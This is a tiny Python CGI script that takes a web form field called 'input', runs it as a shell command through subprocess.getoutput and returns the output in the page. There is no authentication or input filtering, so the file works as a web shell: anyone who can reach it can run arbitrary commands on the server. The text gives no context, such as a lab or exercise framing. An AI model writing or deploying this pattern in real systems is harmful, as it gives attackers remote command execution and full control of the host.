  
#!/usr/bin/python3

print("content-type:text/html\n")

import cgi
import subprocess

inp=cgi.FieldStorage()
x=inp.getvalue("input")
z=subprocess.getoutput(x)
print(z)
